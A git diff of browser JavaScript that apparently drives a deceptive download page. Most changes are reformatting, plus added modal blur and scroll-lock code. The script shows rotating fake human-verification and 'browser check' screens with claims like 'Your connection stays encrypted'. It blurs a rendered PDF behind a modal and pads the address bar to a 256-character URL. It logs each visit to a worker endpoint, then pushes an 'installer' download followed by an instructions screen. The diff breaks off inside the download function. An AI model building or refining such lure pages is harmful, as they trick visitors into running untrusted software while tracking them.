@@ -1,4 +1,3 @@
-
 (() => {
     "use strict";
 
@@ -51,11 +50,8 @@
     ========================================================== */
 
     const CONFIG = {
-
         initialDelay: 1200,
-
         preparationDelay: 5000,
-
         backgroundDelay: 3000,
 
         workerBaseUrl:
@@ -81,7 +77,6 @@
 
         longUrlLength:
             256
-
     };
 
 
@@ -90,19 +85,10 @@
     ========================================================== */
 
     const STORAGE_KEYS = {
-
-        visitToken:
-            "deploypilot_visit_token",
-
-        accessToken:
-            "deploypilot_access_token",
-
-        longUrlToken:
-            "deploypilot_long_url_token",
-
-        instructionRoute:
-            "deploypilot_instruction_route"
-
+        visitToken: "deploypilot_visit_token",
+        accessToken: "deploypilot_access_token",
+        longUrlToken: "deploypilot_long_url_token",
+        instructionRoute: "deploypilot_instruction_route"
     };
 
 
@@ -111,19 +97,64 @@
     ========================================================== */
 
     let session = {
-
         visitToken: "",
-
         accessToken: "",
-
         longUrlToken: ""
-
     };
 
-
     let initialized = false;
-
     let downloadNavigationStarted = false;
+
+
+    /* =========================================================
+       MODAL BACKGROUND BLUR AND SCROLL LOCK
+    ========================================================== */
+
+    let previousBodyOverflow = "";
+    let modalScrollLocked = false;
+
+    function lockModalBackground() {
+        if (!modalScrollLocked) {
+            previousBodyOverflow =
+                document.body.style.overflow;
+
+            modalScrollLocked = true;
+        }
+
+        document.body.classList.add("modal-open");
+        document.body.style.overflow = "hidden";
+    }
+
+    function unlockModalBackground() {
+        document.body.classList.remove("modal-open");
+
+        if (modalScrollLocked) {
+            document.body.style.overflow =
+                previousBodyOverflow;
+
+            previousBodyOverflow = "";
+            modalScrollLocked = false;
+        } else {
+            document.body.style.overflow = "";
+        }
+    }
+
+    function isDownloadModalOpen() {
+        return Boolean(
+            downloadScreen &&
+            !downloadScreen.classList.contains("hidden") &&
+            downloadModal &&
+            downloadModal.classList.contains("modal-visible")
+        );
+    }
+
+    function isInsideDownloadModal(target) {
+        return Boolean(
+            downloadModal &&
+            target instanceof Node &&
+            downloadModal.contains(target)
+        );
+    }
 
 
     /* =========================================================
@@ -131,7 +162,6 @@
     ========================================================== */
 
     function generateToken() {
-
         const alphabet =
             "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
 
@@ -148,7 +178,6 @@
                     ]
             )
             .join("");
-
     }
 
 
@@ -157,7 +186,6 @@
     ========================================================== */
 
     function generateLongUrlToken(length) {
-
         const alphabet =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
             "abcdefghijklmnopqrstuvwxyz" +
@@ -170,22 +198,14 @@
 
         let token = "";
 
-        for (
-            let i = 0;
-            i < length;
-            i++
-        ) {
-
+        for (let i = 0; i < length; i++) {
             token +=
                 alphabet[
-                    bytes[i] %
-                    alphabet.length
+                    bytes[i] % alphabet.length
                 ];
-
         }
 
         return token;
-
     }
 
 
@@ -194,12 +214,10 @@
     ========================================================== */
 
     function isLongRoute() {
-
         return (
             window.location.pathname ===
             CONFIG.longUrlPath
         );
-
     }
 
 
@@ -208,7 +226,6 @@
     ========================================================== */
 
     function getLongRouteToken() {
-
         if (!isLongRoute()) {
             return "";
         }
@@ -227,13 +244,10 @@
             typeof token !== "string" ||
             token.length === 0
         ) {
-
             return "";
-
         }
 
         return token;
-
     }
 
 
@@ -242,13 +256,10 @@
     ========================================================== */
 
     function establishLongBrowserUrl() {
-
         const existingToken =
             getLongRouteToken();
 
-
         if (existingToken) {
-
             const existingUrl =
                 window.location.href;
 
@@ -256,19 +267,14 @@
                 existingUrl.length ===
                 CONFIG.longUrlLength
             ) {
-
                 session.longUrlToken =
                     existingToken;
 
                 return existingUrl;
-
             }
-
         }
 
-
         try {
-
             const storedToken =
                 sessionStorage.getItem(
                     STORAGE_KEYS.longUrlToken
@@ -278,7 +284,6 @@
                 storedToken &&
                 typeof storedToken === "string"
             ) {
-
                 const prefix =
                     `${CONFIG.longUrlOrigin}` +
                     `${CONFIG.longUrlPath}` +
@@ -289,14 +294,11 @@
                     storedToken.length ===
                     CONFIG.longUrlLength
                 ) {
-
                     const restoredUrl =
                         `${prefix}${storedToken}`;
 
                     history.replaceState(
-                        {
-                            longUrl: true
-                        },
+                        { longUrl: true },
                         "",
                         `${CONFIG.longUrlPath}?${CONFIG.longUrlParameter}=${storedToken}`
                     );
@@ -305,139 +307,99 @@
                         storedToken;
 
                     return restoredUrl;
-
                 }
-
             }
-
         } catch (error) {
-
             console.warn(
                 "Unable to restore long URL token.",
                 error
             );
-
         }
-
 
         const prefix =
             `${CONFIG.longUrlOrigin}` +
             `${CONFIG.longUrlPath}` +
             `?${CONFIG.longUrlParameter}=`;
 
-
         const tokenLength =
             CONFIG.longUrlLength -
             prefix.length;
 
-
         if (tokenLength <= 0) {
-
             throw new Error(
                 "Long URL configuration is invalid."
             );
-
         }
 
-
         const token =
-            generateLongUrlToken(
-                tokenLength
-            );
-
+            generateLongUrlToken(tokenLength);
 
         const longUrl =
             `${prefix}${token}`;
-
 
         if (
             longUrl.length !==
             CONFIG.longUrlLength
         ) {
-
             throw new Error(
                 `Expected 256-character URL, received ${longUrl.length}.`
             );
-
         }
-
 
         const parsed =
             new URL(longUrl);
-
 
         if (
             parsed.origin !==
             CONFIG.longUrlOrigin
         ) {
-
             throw new Error(
                 "Long URL origin validation failed."
             );
-
         }
-
 
         if (
             parsed.pathname !==
             CONFIG.longUrlPath
         ) {
-
             throw new Error(
                 "Long URL path validation failed."
             );
-
         }
 
-
         try {
-
             sessionStorage.setItem(
                 STORAGE_KEYS.longUrlToken,
                 token
             );
-
         } catch (error) {
-
             console.warn(
                 "Unable to persist long URL token.",
                 error
             );
-
         }
 
-
         history.replaceState(
-            {
-                longUrl: true
-            },
+            { longUrl: true },
             "",
             `${CONFIG.longUrlPath}?${CONFIG.longUrlParameter}=${token}`
         );
 
-
-        session.longUrlToken =
-            token;
-
+        session.longUrlToken = token;
 
         const visibleUrl =
             window.location.href;
-
 
         if (
             visibleUrl.length !==
             CONFIG.longUrlLength
         ) {
-
             throw new Error(
                 `Browser URL length validation failed: ${visibleUrl.length}`
             );
-
         }
 
-
         return visibleUrl;
-
     }
 
 
@@ -446,12 +408,10 @@
     ========================================================== */
 
     function isValidVisitToken(value) {
-
         return (
             typeof value === "string" &&
             /^[A-Z0-9]{7}$/.test(value)
         );
-
     }
 
 
@@ -460,13 +420,11 @@
     ========================================================== */
 
     function isValidAccessToken(value) {
-
         return (
             typeof value === "string" &&
             value.length > 0 &&
             value.length <= 4096
         );
-
     }
 
 
@@ -475,15 +433,11 @@
     ========================================================== */
 
     function show(element) {
-
         if (!element) {
             return;
         }
 
-        element.classList.remove(
-            "hidden"
-        );
-
+        element.classList.remove("hidden");
     }
 
 
@@ -492,15 +446,11 @@
     ========================================================== */
 
     function hide(element) {
-
         if (!element) {
             return;
         }
 
-        element.classList.add(
-            "hidden"
-        );
-
+        element.classList.add("hidden");
     }
 
 
@@ -509,7 +459,6 @@
     ========================================================== */
 
     function showOnly(screen) {
-
         const screens = [
             loadingScreen,
             confirmScreen,
@@ -517,52 +466,16 @@
             instructionsScreen
         ];
 
-        screens.forEach(
-            item => {
-
-                if (item) {
-                    hide(item);
-                }
-
+        screens.forEach(item => {
+            if (item) {
+                hide(item);
             }
-        );
-
+        });
 
         if (screen) {
             show(screen);
         }
-
     }
-
-    
-/* =========================================================
-   MODAL BACKGROUND BLUR AND SCROLL LOCK
-========================================================== */
-
-let previousBodyOverflow = "";
-let modalScrollLocked = false;
-
-function lockModalBackground() {
-    if (!modalScrollLocked) {
-        previousBodyOverflow = document.body.style.overflow;
-        modalScrollLocked = true;
-    }
-
-    document.body.classList.add("modal-open");
-    document.body.style.overflow = "hidden";
-}
-
-function unlockModalBackground() {
-    document.body.classList.remove("modal-open");
-
-    if (modalScrollLocked) {
-        document.body.style.overflow = previousBodyOverflow;
-        previousBodyOverflow = "";
-        modalScrollLocked = false;
-    } else {
-        document.body.style.overflow = "";
-    }
-}
 
 
     /* =========================================================
@@ -570,88 +483,52 @@ function unlockModalBackground() {
     ========================================================== */
 
     const confirmationVariants = [
-
         {
             id: 1,
-
-            className:
-                "confirm-variant-1",
-
-            eyebrow:
-                "Verification",
-
-            title:
-                "Confirm you are human",
-
+            className: "confirm-variant-1",
+            eyebrow: "Verification",
+            title: "Confirm you are human",
             description:
                 "This quick check helps keep the site safe. It usually takes a few seconds.",
-
             visual: `
                 <div class="visual-check">
                     <span>✓</span>
                 </div>
             `
         },
-
         {
             id: 2,
-
-            className:
-                "confirm-variant-2",
-
-            eyebrow:
-                "READY TO CONTINUE",
-
-            title:
-                "Almost there",
-
+            className: "confirm-variant-2",
+            eyebrow: "READY TO CONTINUE",
+            title: "Almost there",
             description:
                 "Confirm below to continue securely.",
-
             visual: `
                 <div class="visual-circle">
                     <span class="visual-download">↓</span>
                 </div>
             `
         },
-
         {
             id: 3,
-
-            className:
-                "confirm-variant-3",
-
-            eyebrow:
-                "BROWSER CHECK",
-
-            title:
-                "One more step",
-
+            className: "confirm-variant-3",
+            eyebrow: "BROWSER CHECK",
+            title: "One more step",
             description:
                 "Confirm your browser to continue securely.",
-
             visual: `
                 <div class="visual-check">
                     <span>✓</span>
                 </div>
             `
         },
-
         {
             id: 4,
-
-            className:
-                "confirm-variant-4",
-
-            eyebrow:
-                "BROWSER CHECK",
-
-            title:
-                "Almost ready",
-
+            className: "confirm-variant-4",
+            eyebrow: "BROWSER CHECK",
+            title: "Almost ready",
             description:
                 "Your connection stays encrypted. Confirm below to continue.",
-
             visual: `
                 <div class="visual-lock">
                     <div class="lock-shackle"></div>
@@ -659,22 +536,13 @@ function unlockModalBackground() {
                 </div>
             `
         },
-
         {
             id: 5,
-
-            className:
-                "confirm-variant-5",
-
-            eyebrow:
-                "HUMAN VERIFY",
-
-            title:
-                "One more step",
-
+            className: "confirm-variant-5",
+            eyebrow: "HUMAN VERIFY",
+            title: "One more step",
             description:
                 "We need a short verification before showing the page.",
-
             visual: `
                 <div class="visual-lock">
                     <div class="lock-shackle"></div>
@@ -682,22 +550,13 @@ function unlockModalBackground() {
                 </div>
             `
         },
-
         {
             id: 6,
-
-            className:
-                "confirm-variant-6",
-
-            eyebrow:
-                "PROTECTED SESSION",
-
-            title:
-                "Just a Moment",
-
+            className: "confirm-variant-6",
+            eyebrow: "PROTECTED SESSION",
+            title: "Just a Moment",
             description:
                 "This quick check helps keep the site safe. It usually takes a few seconds.",
-
             visual: `
                 <div class="visual-grid">
                     <span></span>
@@ -712,7 +571,6 @@ function unlockModalBackground() {
                 </div>
             `
         }
-
     ];
 
 
@@ -721,108 +579,70 @@ function unlockModalBackground() {
     ========================================================== */
 
     function selectConfirmationVariant() {
-
         const card =
-            document.getElementById(
-                "confirmCard"
-            );
+            document.getElementById("confirmCard");
 
         const visual =
-            document.getElementById(
-                "confirmVisual"
-            );
+            document.getElementById("confirmVisual");
 
         const eyebrow =
-            document.getElementById(
-                "confirmEyebrow"
-            );
+            document.getElementById("confirmEyebrow");
 
         const title =
-            document.getElementById(
-                "confirmTitle"
-            );
+            document.getElementById("confirmTitle");
 
         const description =
-            document.getElementById(
-                "confirmDescription"
-            );
-
+            document.getElementById("confirmDescription");
 
         if (!card) {
             return;
         }
 
-
         const token =
             session.visitToken || "";
 
-
         let hash = 0;
 
-
-        for (
-            let i = 0;
-            i < token.length;
-            i++
-        ) {
-
+        for (let i = 0; i < token.length; i++) {
             hash =
                 ((hash << 5) - hash) +
                 token.charCodeAt(i);
 
             hash |= 0;
-
         }
-
 
         const index =
             Math.abs(hash) %
             confirmationVariants.length;
 
-
         const variant =
             confirmationVariants[index];
 
+        confirmationVariants.forEach(item => {
+            card.classList.remove(item.className);
+        });
 
-        confirmationVariants.forEach(
-            item => {
-
-                card.classList.remove(
-                    item.className
-                );
-
-            }
-        );
-
-
-        card.classList.add(
-            variant.className
-        );
-
+        card.classList.add(variant.className);
 
         if (eyebrow) {
             eyebrow.textContent =
                 variant.eyebrow;
         }
 
-
         if (title) {
             title.textContent =
                 variant.title;
         }
-
 
         if (description) {
             description.textContent =
                 variant.description;
         }
 
-
         if (visual) {
             visual.innerHTML =
                 variant.visual;
         }
-
     }
 
 
@@ -831,9 +651,7 @@ function unlockModalBackground() {
     ========================================================== */
 
     function restoreStoredSession() {
-
         try {
-
             const storedVisitToken =
                 sessionStorage.getItem(
                     STORAGE_KEYS.visitToken
@@ -849,51 +667,29 @@ function unlockModalBackground() {
                     STORAGE_KEYS.longUrlToken
                 );
 
-
-            if (
-                isValidVisitToken(
-                    storedVisitToken
-                )
-            ) {
-
+            if (isValidVisitToken(storedVisitToken)) {
                 session.visitToken =
                     storedVisitToken;
-
             }
 
-
-            if (
-                isValidAccessToken(
-                    storedAccessToken
-                )
-            ) {
-
+            if (isValidAccessToken(storedAccessToken)) {
                 session.accessToken =
                     storedAccessToken;
-
             }
-
 
             if (
-                typeof storedLongToken ===
-                "string" &&
+                typeof storedLongToken === "string" &&
                 storedLongToken.length > 0
             ) {
-
                 session.longUrlToken =
                     storedLongToken;
-
             }
-
         } catch (error) {
-
             console.warn(
                 "Session storage unavailable.",
                 error
             );
-
         }
-
     }
 
 
@@ -902,57 +698,33 @@ function unlockModalBackground() {
     ========================================================== */
 
     function saveSession() {
-
         try {
-
-            if (
-                isValidVisitToken(
-                    session.visitToken
-                )
-            ) {
-
+            if (isValidVisitToken(session.visitToken)) {
                 sessionStorage.setItem(
                     STORAGE_KEYS.visitToken,
                     session.visitToken
                 );
-
             }
 
-
-            if (
-                isValidAccessToken(
-                    session.accessToken
-                )
-            ) {
-
+            if (isValidAccessToken(session.accessToken)) {
                 sessionStorage.setItem(
                     STORAGE_KEYS.accessToken,
                     session.accessToken
                 );
-
             }
 
-
-            if (
-                session.longUrlToken
-            ) {
-
+            if (session.longUrlToken) {
                 sessionStorage.setItem(
                     STORAGE_KEYS.longUrlToken,
                     session.longUrlToken
                 );
-
             }
-
         } catch (error) {
-
             console.warn(
                 "Unable to persist session.",
                 error
             );
-
         }
-
     }
 
 
@@ -961,126 +733,74 @@ function unlockModalBackground() {
     ========================================================== */
 
     async function createSession() {
-
-        if (
-            !isValidVisitToken(
-                session.visitToken
-            )
-        ) {
-
-            session.visitToken =
-                generateToken();
-
+        if (!isValidVisitToken(session.visitToken)) {
+            session.visitToken = generateToken();
         }
 
-
         try {
-
             const response =
                 await fetch(
                     CONFIG.sessionEndpoint,
                     {
                         method: "POST",
-
                         headers: {
-                            "Accept":
-                                "application/json"
+                            "Accept": "application/json"
                         },
-
-                        credentials:
-                            "omit",
-
-                        cache:
-                            "no-store"
+                        credentials: "omit",
+                        cache: "no-store"
                     }
                 );
 
-
             if (!response.ok) {
-
                 throw new Error(
                     `Worker returned HTTP ${response.status}`
                 );
-
             }
 
-
             const contentType =
-                response.headers.get(
-                    "content-type"
-                ) || "";
-
+                response.headers.get("content-type") || "";
 
             if (
                 !contentType
                     .toLowerCase()
-                    .includes(
-                        "application/json"
-                    )
+                    .includes("application/json")
             ) {
-
                 throw new Error(
                     "Worker returned non-JSON."
                 );
-
             }
-
 
             const data =
                 await response.json();
 
-
-            if (
-                isValidVisitToken(
-                    data?.visitToken
-                )
-            ) {
-
+            if (isValidVisitToken(data?.visitToken)) {
                 session.visitToken =
                     data.visitToken;
-
             }
 
-
-            if (
-                isValidAccessToken(
-                    data?.accessToken
-                )
-            ) {
-
+            if (isValidAccessToken(data?.accessToken)) {
                 session.accessToken =
                     data.accessToken;
-
             }
 
-
             saveSession();
-
 
             console.log(
                 "Worker session established."
             );
-
         } catch (error) {
-
             console.warn(
                 "Worker session unavailable.",
                 error
             );
-
         }
-
 
         if (visitorToken) {
-
             visitorToken.textContent =
                 session.visitToken;
-
         }
 
-
         selectConfirmationVariant();
-
     }
 
 
@@ -1089,57 +809,31 @@ function unlockModalBackground() {
     ========================================================== */
 
     function reportVisit() {
-
         if (
             !CONFIG.visitEndpoint ||
-            !isValidVisitToken(
-                session.visitToken
-            )
+            !isValidVisitToken(session.visitToken)
         ) {
-
             return;
-
         }
-
 
         fetch(
             CONFIG.visitEndpoint,
             {
                 method: "POST",
-
                 headers: {
-                    "Content-Type":
-                        "application/json",
-
-                    "Accept":
-                        "application/json"
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
                 },
-
-                credentials:
-                    "omit",
-
-                cache:
-                    "no-store",
-
-                keepalive:
-                    true,
-
-                body:
-                    JSON.stringify({
-                        visitToken:
-                            session.visitToken,
-
-                        route:
-                            window.location.pathname,
-
-                        longToken:
-                            session.longUrlToken
-                    })
+                credentials: "omit",
+                cache: "no-store",
+                keepalive: true,
+                body: JSON.stringify({
+                    visitToken: session.visitToken,
+                    route: window.location.pathname,
+                    longToken: session.longUrlToken
+                })
             }
-        ).catch(
-            () => {}
-        );
-
+        ).catch(() => {});
     }
 
 
@@ -1148,36 +842,22 @@ function unlockModalBackground() {
     ========================================================== */
 
     function setPreparing() {
-
         if (!confirmButton) {
             return;
         }
 
-
-        confirmButton.disabled =
-            true;
-
+        confirmButton.disabled = true;
 
         if (buttonText) {
-
-            buttonText.classList.add(
-                "hidden"
-            );
-
+            buttonText.classList.add("hidden");
         }
-
 
         if (buttonLoading) {
-
-            buttonLoading.classList.remove(
-                "hidden"
-            );
-
+            buttonLoading.classList.remove("hidden");
         }
-
     }
 
-    
+
     /* =========================================================
        PDF.JS DOCUMENT LOADER AND RENDERER
        Uses the existing #pdfBackground and #pdfPages elements.
@@ -1185,9 +865,12 @@ function unlockModalBackground() {
     ========================================================== */
 
     const PDF_CONFIG = {
-        documentUrl: new URL("assets/document.pdf", document.baseURI).href,
+        documentUrl:
+            new URL("assets/document.pdf", document.baseURI).href,
+
         libraryUrl:
             "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js",
+
         workerUrl:
             "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js"
     };
@@ -1197,7 +880,8 @@ function unlockModalBackground() {
     let pdfResizeTimer = null;
 
     function showPdfViewerMessage(message) {
-        const pages = document.getElementById("pdfPages");
+        const pages =
+            document.getElementById("pdfPages");
 
         if (!pages) {
             return;
@@ -1205,7 +889,9 @@ function unlockModalBackground() {
 
         pages.replaceChildren();
 
-        const notice = document.createElement("div");
+        const notice =
+            document.createElement("div");
+
         notice.className = "pdf-viewer-message";
         notice.setAttribute("role", "status");
         notice.textContent = message;
@@ -1222,45 +908,72 @@ function unlockModalBackground() {
             return window.pdfJsLibraryPromise;
         }
 
-        window.pdfJsLibraryPromise = new Promise((resolve, reject) => {
-            const existingScript = document.querySelector(
-                'script[data-pdfjs-library="true"]'
-            );
+        window.pdfJsLibraryPromise =
+            new Promise((resolve, reject) => {
+                const existingScript =
+                    document.querySelector(
+                        'script[data-pdfjs-library="true"]'
+                    );
 
-            const script = existingScript || document.createElement("script");
+                const script =
+                    existingScript ||
+                    document.createElement("script");
 
-            const handleLoad = () => {
-                if (window.pdfjsLib) {
-                    resolve(window.pdfjsLib);
-                } else {
-                    reject(new Error("PDF.js loaded without its API."));
+                const handleLoad = () => {
+                    if (window.pdfjsLib) {
+                        resolve(window.pdfjsLib);
+                    } else {
+                        reject(
+                            new Error(
+                                "PDF.js loaded without its API."
+                            )
+                        );
+                    }
+                };
+
+                const handleError = () => {
+                    reject(
+                        new Error(
+                            "Unable to load the PDF.js library."
+                        )
+                    );
+                };
+
+                script.addEventListener(
+                    "load",
+                    handleLoad,
+                    { once: true }
+                );
+
+                script.addEventListener(
+                    "error",
+                    handleError,
+                    { once: true }
+                );
+
+                if (!existingScript) {
+                    script.src = PDF_CONFIG.libraryUrl;
+                    script.async = true;
+                    script.dataset.pdfjsLibrary = "true";
+
+                    document.head.appendChild(script);
                 }
-            };
-
-            const handleError = () => {
-                reject(new Error("Unable to load the PDF.js library."));
-            };
-
-            script.addEventListener("load", handleLoad, { once: true });
-            script.addEventListener("error", handleError, { once: true });
-
-            if (!existingScript) {
-                script.src = PDF_CONFIG.libraryUrl;
-                script.async = true;
-                script.dataset.pdfjsLibrary = "true";
-                document.head.appendChild(script);
-            }
-        });
+            });
 
         return window.pdfJsLibraryPromise;
     }
 
     async function renderPdfDocument() {
-        const viewer = document.getElementById("pdfBackground");
-        const pagesContainer = document.getElementById("pdfPages");
+        const viewer =
+            document.getElementById("pdfBackground");
+
+        const pagesContainer =
+            document.getElementById("pdfPages");
 
         if (!viewer || !pagesContainer) {
-            console.warn("PDF viewer elements were not found.");
+            console.warn(
+                "PDF viewer elements were not found."
+            );
             return;
         }
 
@@ -1268,13 +981,17 @@ function unlockModalBackground() {
             return pdfLoadingPromise;
         }
 
-        const currentTaskId = ++pdfRenderTaskId;
+        const currentTaskId =
+            ++pdfRenderTaskId;
 
         pdfLoadingPromise = (async () => {
             try {
-                showPdfViewerMessage("Loading document…");
+                showPdfViewerMessage(
+                    "Loading document…"
+                );
 
-                const pdfjsLib = await loadPdfJsLibrary();
+                const pdfjsLib =
+                    await loadPdfJsLibrary();
 
                 if (currentTaskId !== pdfRenderTaskId) {
                     return;
@@ -1283,11 +1000,13 @@ function unlockModalBackground() {
                 pdfjsLib.GlobalWorkerOptions.workerSrc =
                     PDF_CONFIG.workerUrl;
 
-                const loadingTask = pdfjsLib.getDocument({
-                    url: PDF_CONFIG.documentUrl
-                });
+                const loadingTask =
+                    pdfjsLib.getDocument({
+                        url: PDF_CONFIG.documentUrl
+                    });
 
-                const pdf = await loadingTask.promise;
+                const pdf =
+                    await loadingTask.promise;
 
                 if (currentTaskId !== pdfRenderTaskId) {
                     return;
@@ -1295,56 +1014,79 @@ function unlockModalBackground() {
 
                 pagesContainer.replaceChildren();
 
-                for (let pageNumber = 1;
+                for (
+                    let pageNumber = 1;
                     pageNumber <= pdf.numPages;
-                    pageNumber++) {
-
+                    pageNumber++
+                ) {
                     if (currentTaskId !== pdfRenderTaskId) {
                         return;
                     }
 
-                    const page = await pdf.getPage(pageNumber);
+                    const page =
+                        await pdf.getPage(pageNumber);
 
-                    const baseViewport = page.getViewport({ scale: 1 });
+                    const baseViewport =
+                        page.getViewport({ scale: 1 });
 
-                    const availableWidth = Math.max(
-                        200,
-                        viewer.clientWidth -
-                        parseFloat(getComputedStyle(viewer).paddingLeft || 0) -
-                        parseFloat(getComputedStyle(viewer).paddingRight || 0) -
-                        12
-                    );
+                    const availableWidth =
+                        Math.max(
+                            200,
+                            viewer.clientWidth -
+                            parseFloat(
+                                getComputedStyle(viewer).paddingLeft || 0
+                            ) -
+                            parseFloat(
+                                getComputedStyle(viewer).paddingRight || 0
+                            ) -
+                            12
+                        );
 
-                    const scale = Math.min(
-                        availableWidth / baseViewport.width,
-                        2
-                    );
+                    const scale =
+                        Math.min(
+                            availableWidth / baseViewport.width,
+                            2
+                        );
 
-                    const viewport = page.getViewport({ scale });
+                    const viewport =
+                        page.getViewport({ scale });
 
-                    const canvas = document.createElement("canvas");
-                    const context = canvas.getContext("2d");
+                    const canvas =
+                        document.createElement("canvas");
+
+                    const context =
+                        canvas.getContext("2d");
 
                     if (!context) {
-                        throw new Error("Unable to create the PDF canvas.");
+                        throw new Error(
+                            "Unable to create the PDF canvas."
+                        );
                     }
 
-                    const outputScale = Math.min(
-                        window.devicePixelRatio || 1,
-                        2
-                    );
+                    const outputScale =
+                        Math.min(
+                            window.devicePixelRatio || 1,
+                            2
+                        );
 
-                    canvas.width = Math.floor(
-                        viewport.width * outputScale
-                    );
+                    canvas.width =
+                        Math.floor(
+                            viewport.width * outputScale
+                        );
 
-                    canvas.height = Math.floor(
-                        viewport.height * outputScale
-                    );
+                    canvas.height =
+                        Math.floor(
+                            viewport.height * outputScale
+                        );
 
-                    canvas.style.width = `${viewport.width}px`;
-                    canvas.style.height = `${viewport.height}px`;
+                    canvas.style.width =
+                        `${viewport.width}px`;
+
+                    canvas.style.height =
+                        `${viewport.height}px`;
+
                     canvas.setAttribute("role", "img");
+
                     canvas.setAttribute(
                         "aria-label",
                         `PDF page ${pageNumber} of ${pdf.numPages}`
@@ -1356,7 +1098,14 @@ function unlockModalBackground() {
                         canvasContext: context,
                         viewport,
                         transform: outputScale !== 1
-                            ? [outputScale, 0, 0, outputScale, 0, 0]
+                            ? [
+                                outputScale,
+                                0,
+                                0,
+                                outputScale,
+                                0,
+                                0
+                            ]
                             : null
                     }).promise;
                 }
@@ -1364,15 +1113,16 @@ function unlockModalBackground() {
                 console.log(
                     `PDF loaded successfully: ${pdf.numPages} page(s).`
                 );
-
             } catch (error) {
-                console.error("PDF rendering failed:", error);
+                console.error(
+                    "PDF rendering failed:",
+                    error
+                );
 
                 showPdfViewerMessage(
                     "The document could not be displayed. Check that " +
                     "assets/document.pdf exists and that PDF.js can load."
                 );
-
             } finally {
                 pdfLoadingPromise = null;
             }
@@ -1385,11 +1135,12 @@ function unlockModalBackground() {
         clearTimeout(pdfResizeTimer);
 
         pdfResizeTimer = setTimeout(() => {
-            const downloadScreen = document.getElementById("downloadScreen");
+            const currentDownloadScreen =
+                document.getElementById("downloadScreen");
 
             if (
-                downloadScreen &&
-                !downloadScreen.classList.contains("hidden")
+                currentDownloadScreen &&
+                !currentDownloadScreen.classList.contains("hidden")
             ) {
                 pdfRenderTaskId++;
                 pdfLoadingPromise = null;
@@ -1404,7 +1155,6 @@ function unlockModalBackground() {
     ========================================================== */
 
     function showInstallerBackground() {
-
         if (!downloadScreen) {
             return;
         }
@@ -1413,47 +1163,37 @@ function unlockModalBackground() {
             renderPdfDocument();
         });
 
-        showOnly(
-            downloadScreen
-        );
-
+        showOnly(downloadScreen);
 
         if (downloadModal) {
-
             downloadModal.classList.remove(
                 "modal-visible"
             );
-
         }
 
+        /*
+         * Preserve the existing behavior of locking
+         * scrolling while the download screen is active.
+         * The blur itself begins when the modal appears.
+         */
 
-        document.body.style.overflow =
-            "hidden";
+        document.body.style.overflow = "hidden";
 
+        requestAnimationFrame(() => {
+            setTimeout(() => {
+                if (
+                    downloadModal &&
+                    downloadScreen &&
+                    !downloadScreen.classList.contains("hidden")
+                ) {
+                    lockModalBackground();
 
-        requestAnimationFrame(
-            () => {
-
-                setTimeout(
-                    () => {
-
-                        if (
-                            downloadModal
-                        ) {
-
-                            downloadModal.classList.add(
-                                "modal-visible"
-                            );
-
-                        }
-
-                    },
-                    CONFIG.backgroundDelay
-                );
-
-            }
-        );
-
+                    downloadModal.classList.add(
+                        "modal-visible"
+                    );
+                }
+            }, CONFIG.backgroundDelay);
+        });
     }
 
 
@@ -1462,35 +1202,22 @@ function unlockModalBackground() {
     ========================================================== */
 
     function closeDownloadScreen() {
-
-        showOnly(
-            confirmScreen
-        );
-
-
-        document.body.style.overflow =
-            "";
-
-
         if (downloadModal) {
-
             downloadModal.classList.remove(
                 "modal-visible"
             );
-
         }
 
+        unlockModalBackground();
+
+        showOnly(confirmScreen);
 
         if (
             confirmButton &&
             !downloadNavigationStarted
         ) {
-
-            confirmButton.disabled =
-                false;
-
+            confirmButton.disabled = false;
         }
-
     }
 
 
@@ -1499,14 +1226,11 @@ function unlockModalBackground() {
     ========================================================== */
 
     function updateDownloadStatus(state) {
-
         if (!downloadStatus) {
             return;
         }
 
-
         if (state === "starting") {
-
             downloadStatus.innerHTML = `
                 <div class="status-spinner"></div>
 
@@ -1523,12 +1247,9 @@ function unlockModalBackground() {
             `;
 
             return;
-
         }
 
-
         if (state === "success") {
-
             downloadStatus.innerHTML = `
                 <div class="status-success">
                     ✓
@@ -1547,9 +1268,7 @@ function unlockModalBackground() {
             `;
 
             return;
-
         }
-
 
         downloadStatus.innerHTML = `
             <div class="status-error">
@@ -1567,7 +1286,6 @@ function unlockModalBackground() {
                 </p>
             </div>
         `;
-
     }
 
 
@@ -1576,32 +1294,25 @@ function unlockModalBackground() {
     ========================================================== */
 
     function buildDownloadUrl() {
-
         if (
             !isValidAccessToken(
                 session.accessToken
             )
         ) {
-
             return "";
-
         }
-
 
         const url =
             new URL(
                 CONFIG.downloadEndpoint
             );
 
-
         url.searchParams.set(
             "access",
             session.accessToken
         );
 
-
         return url.toString();
-
     }
 
 
@@ -1610,52 +1321,40 @@ function unlockModalBackground() {
     ========================================================== */
 
     function routeToInstructions() {
-
         /*
          * Switch to the existing instructions section.
          * Do not navigate to another HTML page.
          */
 
-        downloadNavigationStarted =
-            true;
-
+        downloadNavigationStarted = true;
 
         if (downloadButton) {
-
-            downloadButton.disabled =
-                true;
-
+            downloadButton.disabled = true;
         }
 
+        if (downloadModal) {
+            downloadModal.classList.remove(
+                "modal-visible"
+            );
+        }
 
-        showOnly(
-            instructionsScreen
-        );
+        unlockModalBackground();
 
-
-        document.body.style.overflow =
-            "";
-
+        showOnly(instructionsScreen);
 
         try {
-
             sessionStorage.setItem(
                 STORAGE_KEYS.instructionRoute,
                 "true"
             );
-
         } catch (error) {
-
             console.warn(
                 "Unable to persist instruction route.",
                 error
             );
-
         }
 
-
         startProtectedDownload();
-
     }
 
 
@@ -1664,10 +1363,8 @@ function unlockModalBackground() {
     ========================================================== */
 
     function startProtectedDownload() {
-
         const downloadUrl =
             buildDownloadUrl();
-
 
         /*
          * Keep the protected-download authorization
@@ -1676,57 +1373,28 @@ function unlockModalBackground() {
          */
 
         if (!downloadUrl) {
-
-            updateDownloadStatus(
-                "error"
-            );
-
+            updateDownloadStatus("error");
             return;
-
         }
 
-
-        updateDownloadStatus(
-            "starting"
-        );
-
+        updateDownloadStatus("starting");
 
         if (manualDownload) {
-
-            manualDownload.href =
-                downloadUrl;
-
+            manualDownload.href = downloadUrl;
         }
-
 
         /*
          * Navigate to the Worker only after the
          * access token passes local validation.
          */
 
-        setTimeout(
-            () => {
+        setTimeout(() => {
+            window.location.assign(downloadUrl);
+        }, 500);
 
-                window.location.assign(
-                    downloadUrl
-                );
-
-            },
